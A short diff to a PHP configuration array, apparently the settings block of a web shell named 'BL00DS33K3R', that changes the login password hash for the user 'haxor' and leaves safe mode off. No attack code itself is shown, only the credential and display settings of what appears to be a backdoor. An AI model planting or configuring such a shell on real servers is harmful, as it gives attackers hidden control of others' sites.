@@ -2,7 +2,7 @@
 
 $GLOBALS['BL00DS33K3R'] = array(
     'username' => 'haxor',
-    'password' => '831167d1d11e16b877055beb00ffec4b',
+    'password' => '323ccdb3aa77bbce2660a8eaab29b574',
     'safe_mode' => '0',
     'login_page' => 'gui',
     'show_icons' => '1',
